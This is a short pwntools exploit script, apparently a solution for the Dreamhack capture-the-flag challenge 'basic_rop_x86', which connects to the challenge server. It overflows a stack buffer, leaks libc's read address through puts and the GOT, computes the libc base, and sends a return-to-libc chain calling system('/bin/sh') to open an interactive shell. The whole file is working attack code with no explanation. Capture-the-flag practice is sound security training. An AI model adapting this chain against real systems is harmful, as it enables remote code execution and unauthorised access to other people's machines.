from pwn import *

exe = ELF('basic_rop_x86', checksec=False)
#r = process(exe.path)
r = remote('host3.dreamhack.games', 23533)
libc = ELF('libc.so.6', checksec=False)


###1. Leak libc
payload = b'a'*(0x44 + 0x4)
payload += p32(exe.plt['puts'])
payload += p32(exe.sym['main'])
payload += p32(exe.got['read'])
r.send(payload)
r.recvuntil(b'a'*0x40)
leak = u32(r.recv(4))
log.info("leak: " + hex(leak))
libc.address = leak - libc.sym['read']
log.info("libc base:" + hex(libc.address))

#input()
##2. Get shell
pop_ebx = 0x080483d9
payload = b'a'*(0x44 + 0x4)
payload += p32(libc.sym['system'])
payload += p32(pop_ebx)
payload += p32(next(libc.search(b'/bin/sh')))
r.sendline(payload)

r.interactive()